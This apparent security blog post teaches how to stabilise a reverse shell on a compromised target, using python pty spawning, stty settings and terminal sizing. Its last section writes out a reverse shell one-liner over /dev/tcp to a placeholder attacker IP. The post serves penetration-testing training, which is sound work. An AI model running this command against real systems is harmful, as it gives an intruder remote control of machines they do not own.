---
title:  "Upgrading your reverse shell"
path: ""
type: posts
layout: single
author_profile: true
read_time: true
comments: true
share: true
related: true
future: true
toc: true
toc_sticky: true
toc_label: "Table of Contents"
toc_icon: "fas fa-book-open"
header:
    image: https://images.unsplash.com/photo-1472152083436-a6eede6efad9?q=80&w=2669&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
    caption: "Photo by [**Biel Morro**](https://unsplash.com/@bielmorro?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash) on [**Unsplash**](https://unsplash.com/photos/brown-conch-shell-on-right-human-palm-_l8ZdgJ9m7w?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash)"
    teaser: https://images.unsplash.com/photo-1472152083436-a6eede6efad9?q=80&w=2669&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
---

> After we have gotten our reverse shell, it will have limitations such as no auto-completions and messy file listings. Here is how we can make our shell better inside our target's system:

Upgrading and stabilizing your shell enables you to type in your commands better. There are several ways to upgrade your shell once you are in a target machine.

## First way

For this method to work, we have to check if our target machine has `python2` or `python3` installed via:
```sh
which python
```
If no output is returned, repeat the above step for `python3`.

Assuming you are running bash, in your reverse shell, run the command below for whichever version of `python` available in the target machine:

```sh
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Press on your keyboard: `Ctrl + Z`<br>

On your local host:

```sh
stty raw -echo; fg
```
Press on your keyboard: `Enter` (twice)
> If your shell formatting is off, simply enter the command:
```sh
reset
```

Notice that our shell does not cover our entire terminal. To fix this, we shall open another terminal tab and input the following commands:
```sh
echo $TERM
```
Output: `xterm-256color`
```sh
stty size
```
Output: `70 255`

In our reverse shell:
```sh
export TERM=xterm-256color
stty rows 70 columns 255
```

Our reverse shell should now utilize the terminal's full features!

## Second way
Check the version of python the target system is running in using:
`which python` or `which python3`

Next,

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'  //Upgrade to tty
Ctrl + Z                                        //Background the process
stty raw -echo
fg + Enter
```

Subsequently, turn your unstable shell into a stable one via:
```sh
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
\
\
Thank you for reading!